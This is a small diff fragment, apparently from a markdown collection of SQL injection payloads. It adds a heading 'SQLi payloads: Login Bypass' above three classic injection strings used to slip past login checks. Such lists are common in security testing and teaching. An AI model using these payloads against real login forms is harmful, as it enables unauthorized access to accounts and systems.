@@ -1,5 +1,7 @@
 
-````py
+## `SQLi payloads`: Login Bypass 
+
+````
 '="or'
 ' or ''-'
 ' or '' '
